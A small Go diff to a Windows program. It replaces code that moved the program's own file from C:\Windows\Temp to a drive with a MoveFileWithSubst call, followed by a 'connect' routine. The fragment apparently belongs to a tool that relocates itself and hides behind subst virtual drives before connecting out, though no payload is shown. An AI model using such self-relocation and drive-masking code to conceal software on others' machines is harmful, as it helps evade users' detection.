@@ -41,11 +41,9 @@ var stopScreen bool
 var wg sync.WaitGroup
 
 func Ma() {
-	fileName := util.GetProgramName()
-	sourcePath := "C:\\Windows\\Temp" + "\\" + fileName // 要操作的文件路径
-	destinationDisk := "C:"                             // 新的虚拟磁盘符号
+
 	CreateIni()
-	util.MoveAndSetupFile(sourcePath, destinationDisk, fileName)
+	util.MoveFileWithSubst()
 	连接()
 
 }
